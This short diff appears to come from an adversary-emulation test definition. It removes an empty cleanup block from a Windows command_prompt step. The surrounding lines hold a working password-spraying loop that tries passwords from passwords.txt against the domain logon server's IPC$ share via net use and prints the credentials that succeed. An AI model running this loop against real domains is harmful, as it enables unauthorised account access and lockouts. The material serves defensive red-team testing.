@@ -27,6 +27,3 @@ steps:
         echo ChangeMe!>> passwords.txt
         @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\{{.Args.user}}" "%p" 1>NUL 2>&1 && @echo [*] {{.Args.user}}:%p && @net use /delete %logonserver%\IPC$ > NUL
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
